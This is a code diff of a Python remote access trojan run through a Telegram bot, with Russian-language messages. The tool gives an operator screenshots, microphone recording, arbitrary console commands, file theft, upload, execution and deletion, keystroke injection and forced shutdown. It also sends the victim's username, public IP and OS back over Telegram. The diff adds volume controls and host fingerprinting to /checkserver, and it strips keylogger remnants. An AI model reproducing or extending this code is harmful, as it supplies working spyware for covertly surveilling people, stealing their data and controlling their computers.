@@ -3,14 +3,11 @@ import os
 import webbrowser
 import requests
 import platform
-import ctypes
 import mouse
 import PIL.ImageGrab
 import cv2
-from PIL import Image, ImageGrab, ImageDraw
+from PIL import Image, ImageGrab
 from pySmartDL import SmartDL
-from telebot import types
-from telebot import apihelper
 import time
 import datetime
 import hashlib
@@ -23,14 +20,11 @@ from pynput.keyboard import Key, Controller
 import pyaudio
 import wave
 import wmi
-import threading
 import pythoncom
 import psutil
 import sounddevice as sd
 import soundfile as sf
 import winsound
-from pynput.keyboard import Key, Listener
-import logging
 
 # checkserver - check connection
 # fastscreen - fastscreen
@@ -64,9 +58,13 @@ import logging
 # playmusic - play music on pc
 # stopmusic - stop playing music
 # khz - start frequency generation
-# getlogs - download keylogger file
+# volume - commands for control volume
+# volup - Turn up the volume
+# voldown - Turn down the volume
+# volmax - Turn max the volume
+# volmute - Mute
 
-my_id = 'a1aa9647b19a51cb7ec0131a920771731636d5ef3429a63ae3878ad20db7540d00ccd935a0fd20f688d07fdd08177267a6f612cb7152dea51634f48ab31ed8cc'
+my_id = ''
 my_id_time = 0
 bot_token = ''
 bot = telebot.TeleBot(bot_token)
@@ -106,11 +104,18 @@ def get_text_messages(message):
         if message.text == "/checkserver":
             date_timer = datetime.datetime.now().minute
             my_id_time = message.from_user.id
+            req = requests.get('https://api.ipify.org')
+            ip = req.text
+            uname = os.getlogin()
+            windows = platform.platform()
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, f'''Связь установлена, отклик: 
-                    {date_start}
-                    {datetime.datetime.now()}
-                    {datetime.datetime.now() - date_start}''')
-
+            {date_start}
+            {datetime.datetime.now()}
+            {datetime.datetime.now() - date_start}
+            *Пользователь:* {uname}
+            *IP:* {ip}
+            *ОС:* {windows}''', parse_mode="markdown")
         try:
             date_now = datetime.datetime.now().minute
             if abs(date_now - date_timer) >= 5:
@@ -129,12 +134,69 @@ def get_text_messages(message):
                 bot.register_next_step_handler(message, get_text_messages)
                 os.remove("screen.png")
             except Exception as e:
+                bot.send_chat_action(my_id_time, 'typing')
                 bot.send_message(my_id_time, f"Ошибка - {e}")
                 bot.register_next_step_handler(message, get_text_messages)
 
         elif message.text == "/fullscreen":
             bot.send_chat_action(my_id_time, 'upload_document')
             screen_process(message)
+
+        elif message.text == "/volume":
+            bot.send_chat_action(my_id_time, 'upload_document')
+            bot.send_message(my_id_time, '''/volup - Turn up the volume
+/voldown - Turn down the volume
+/volmax - Turn max the volume
+/volmute - Mute''')
+
+        elif message.text.startswith("/volup"):
+            try:
+                bot.send_chat_action(my_id_time, 'typing')
+                vl = round(int(message.text[6:])/2)
+                for i in range(vl):
+                    keyboard.press(Key.media_volume_up)
+                    keyboard.release(Key.media_volume_up)
+                bot.send_message(my_id_time, f"Громкость увеличена на {vl*2}")
+            except Exception as e:
+                bot.send_chat_action(my_id_time, 'typing')
+                bot.send_message(my_id_time, f"Ошибка - {e}")
+                bot.register_next_step_handler(message, get_text_messages)
+
+        elif message.text.startswith("/voldown"):
+            try:
+                bot.send_chat_action(my_id_time, 'typing')
+                vl = round(int(message.text[8:])/2)
+                for i in range(vl):
+                    keyboard.press(Key.media_volume_down)
+                    keyboard.release(Key.media_volume_down)
+                bot.send_message(my_id_time, f"Громкость уменьшена на {vl*2}")
+            except Exception as e:
+                bot.send_chat_action(my_id_time, 'typing')
+                bot.send_message(my_id_time, f"Ошибка - {e}")
+                bot.register_next_step_handler(message, get_text_messages)
+
+        elif message.text == "/volmax":
+            try:
+                bot.send_chat_action(my_id_time, 'typing')
+                for i in range(100):
+                    keyboard.press(Key.media_volume_up)
+                    keyboard.release(Key.media_volume_up)
+                bot.send_message(my_id_time, "Звук увеличен на максимум")
+            except Exception as e:
+                bot.send_chat_action(my_id_time, 'typing')
+                bot.send_message(my_id_time, f"Ошибка - {e}")
+                bot.register_next_step_handler(message, get_text_messages)
+
+        elif message.text == "/volmute":
+            try:
+                bot.send_chat_action(my_id_time, 'typing')
+                keyboard.press(Key.media_volume_mute)
+                keyboard.release(Key.media_volume_mute)
+                bot.send_message(my_id_time, "Звук выключен")
+            except Exception as e:
+                bot.send_chat_action(my_id_time, 'typing')
+                bot.send_message(my_id_time, f"Ошибка - {e}")
+                bot.register_next_step_handler(message, get_text_messages)
 
         elif message.text == "/getlogs":
             bot.send_chat_action(my_id_time, 'typing')
@@ -162,17 +224,22 @@ def get_text_messages(message):
                 bot.register_next_step_handler(message, get_text_messages)
 
         elif message.text == "/msg":
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "Укажите текст уведомления:")
             bot.register_next_step_handler(message, messaga_process)
+
         elif message.text == "/goweb":
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "Укажите ссылку: ")
             bot.register_next_step_handler(message, web_process)
 
         elif message.text == "/playmusic":
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "Укажите путь или ссылку для воспроизводимого файла: ")
             bot.register_next_step_handler(message, play_music)
 
         elif message.text == "/khz":
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "Укажите частоту воспроизведения и время через знак @(ПР: 17000@6000, частота 17000гц, время 6000 миллисекунд):")
             bot.register_next_step_handler(message, khz)
 
@@ -182,62 +249,88 @@ def get_text_messages(message):
                 os.remove("temp_music.mp3")
             except:
                 pass
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "Воспроизведение остановлено")
             bot.register_next_step_handler(message, get_text_messages)
 
         elif message.text == "/startcmd":
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "Укажите консольную команду: ")
             bot.register_next_step_handler(message, cmd_process)
 
         elif message.text == "/poweroff":
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "Выключение компьютера...")
-            os.popen('shutdown /s /f /t 0')
+            try:
+                os.popen('shutdown /s /f /t 0')
+            except:
+                pass
             bot.register_next_step_handler(message, get_text_messages)
 
         elif message.text == "/reboot":
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "Перезагрузка компьютера...")
-            os.popen('shutdown /r /f /t 0')
+            try:
+                os.popen('shutdown /r /f /t 0')
+            except:
+                pass
             bot.register_next_step_handler(message, get_text_messages)
 
         elif message.text == "/hibernation":
             bot.send_message(my_id_time, "Гибернация...")
-            os.popen('shutdown /h')
+            try:
+                os.popen('shutdown /h')
+            except:
+                pass
             bot.register_next_step_handler(message, get_text_messages)
 
         elif message.text == "/deletefile":
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "Укажите путь файла для удаления:")
             bot.register_next_step_handler(message, delete_file)
 
         elif message.text == "/aboutpc":
-            req = requests.get('https://api.ipify.org')
-            ip = req.text
-            uname = os.getlogin()
-            windows = platform.platform()
-            processor = platform.processor()
-            bot.send_message(my_id_time, f"*Пользователь:* {uname}\n*IP:* {ip}\n*ОС:* {windows}\n*Процессор:* {processor}", parse_mode="markdown")
-            bot.register_next_step_handler(message, get_text_messages)
+            try:
+                bot.send_chat_action(my_id_time, 'typing')
+                req = requests.get('https://api.ipify.org')
+                ip = req.text
+                uname = os.getlogin()
+                windows = platform.platform()
+                processor = platform.processor()
+                bot.send_message(my_id_time, f"*Пользователь:* {uname}\n*IP:* {ip}\n*ОС:* {windows}\n*Процессор:* {processor}", parse_mode="markdown")
+                bot.register_next_step_handler(message, get_text_messages)
+            except Exception as e:
+                bot.send_chat_action(my_id_time, 'typing')
+                bot.send_message(my_id_time, f"Ошибка - {e}")
+                bot.register_next_step_handler(message, get_text_messages)
 
         elif message.text == "/hear":
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "Укажите время прослушивания(не более 200):")
             bot.register_next_step_handler(message, hear_process)
 
         elif message.text == "/findpaths":
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "Укажите стартовый репозиторий: ")
             bot.register_next_step_handler(message, start_rat)
 
         elif message.text == "/startfile":
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "Укажите путь до файла: ")
             bot.register_next_step_handler(message, start_process)
 
         elif message.text == "/downloadfile":
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "Укажите путь до файла: ")
             bot.register_next_step_handler(message, downfile_process)
 
         elif message.text == "/uploadfile":
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "Отправьте необходимый файл")
             bot.register_next_step_handler(message, uploadfile_process)
 
         elif message.text == "/downloadweb":
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "Укажите прямую ссылку скачивания:")
             bot.register_next_step_handler(message, uploadurl_process)
 
@@ -308,27 +401,32 @@ def get_text_messages(message):
 
         elif message.text == "/key":
             bot.send_chat_action(my_id_time, 'typing')
-            bot.send_message(my_id_time, f"Введите нажатие клавиш(ПР: AltF4, WinD, CtlV)")
+            bot.send_message(my_id_time, f"Введите нажатие клавиш(ПР: AltF4, WinD, CtlV, если одна клавиша: nonEsc)")
             bot.register_next_step_handler(message, key_write)
 
         elif message.text == "/test":
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "test successful")
 
         elif message.text == "/abortprogram":
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, "Вы уверены, что хотите завершить выполнение программы? Это действие необратимо, и ведет за собой последствия! После завершения программы ее нельзя будет больше запустить! Для подтверждения операции введите \"YesIWantToAbortProgramNow!\", для отказа введите \"Cancel\" или любое другое слово")
             bot.register_next_step_handler(message, abort_program)
 
         else:
             if message.text != "/checkserver":
+                bot.send_chat_action(my_id_time, 'typing')
                 bot.send_message(my_id_time, "Это хрень, а не команда!")
     else:
         info_user(message)
 
 def abort_program(message):
     if message.text == "YesIWantToAbortProgramNow!" or message.text == "03052010":
+        bot.send_chat_action(my_id_time, 'typing')
         bot.send_message(my_id_time, "Программа будет отключена немедленно!")
         os.abort()
     else:
+        bot.send_chat_action(my_id_time, 'typing')
         bot.send_message(my_id_time, "Отмена завершения программы")
         bot.register_next_step_handler(message, get_text_messages)
 
@@ -339,20 +437,26 @@ def khz(message):
         if len(parts) > 1:
             if is_digit(parts[0]) and is_digit(parts[1]):
                 if int(parts[0]) < 37 or int(parts[0]) > 32767:
+                    bot.send_chat_action(my_id_time, 'typing')
                     bot.send_message(my_id_time, f"Значения частоты вне границы! Введите значение в границах от 37 до 32767")
                     bot.register_next_step_handler(message, get_text_messages)
                 else:
+                    bot.send_chat_action(my_id_time, 'typing')
                     bot.send_message(my_id_time, f"Воспроизведение началось")
                     winsound.Beep(int(parts[0]), int(parts[1]))
+                    bot.send_chat_action(my_id_time, 'typing')
                     bot.send_message(my_id_time, f"Воспроизведение окончено")
                     bot.register_next_step_handler(message, get_text_messages)
             else:
+                bot.send_chat_action(my_id_time, 'typing')
                 bot.send_message(my_id_time, f"В строке присутствуют лишние символы. Требуется ввести целое число: ")
                 bot.register_next_step_handler(message, khz)
         else:
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, f"Не найден знак разделения")
             bot.register_next_step_handler(message, get_text_messages)
     except Exception as e:
+        bot.send_chat_action(my_id_time, 'typing')
         bot.send_message(my_id_time, f"Ошибка - {e}")
         bot.register_next_step_handler(message, get_text_messages)
 
@@ -369,6 +473,7 @@ def info_user(message):
             global alarm_message
             alarm_message += alert
         else:
+            bot.send_chat_action(my_id_time, 'typing')
             bot.send_message(my_id_time, alert)
             bot.register_next_step_handler(message, get_text_messages)
     except:
@@ -403,6 +508,7 @@ def play_music(message):
             bot.register_next_step_handler(message, get_text_messages)
 
     except Exception as e:
+        bot.send_chat_action(my_id_time, 'typing')
         bot.send_message(my_id_time, f'Ошибка - {e}')
         bot.register_next_step_handler(message, get_text_messages)
 
@@ -432,6 +538,7 @@ def hear_process(message):
         os.remove(wav_path)
         bot.register_next_step_handler(message, get_text_messages)
     except Exception as e:
+        bot.send_chat_action(my_id_time, 'typing')
         bot.send_message(my_id_time, f'Ошибка - {e}')
         bot.register_next_step_handler(message, get_text_messages)
 
@@ -461,6 +568,7 @@ def start_rat(message):
             bot.send_message(my_id_time, f"Файлы отсуствуют в репозитории {path}")
             bot.register_next_step_handler(message, get_text_messages)
     except Exception as e:
+        bot.send_chat_action(my_id_time, 'typing')
         bot.send_message(my_id_time, f'Ошибка - {e}')
         bot.register_next_step_handler(message, get_text_messages)
 
@@ -529,6 +637,11 @@ def key_write(message):
             keyboard.release(str(key_stroke[3:]))
             keyboard.release(Key.shift)
             bot.send_message(my_id_time, f"Комбинация клавиш \"{key_stroke}\" успешно нажата")
+            bot.register_next_step_handler(message, get_text_messages)
+        if key_stroke[:3] == "non":
+            keyboard.press(getattr(Key, str(key_stroke[3:])))
+            keyboard.release(getattr(Key, str(key_stroke[3:])))
+            bot.send_message(my_id_time, f"Клавиша \"{key_stroke}\" успешно нажата")
             bot.register_next_step_handler(message, get_text_messages)
     except Exception as e:
         bot.send_message(my_id_time, f"Ошибка - {e}")
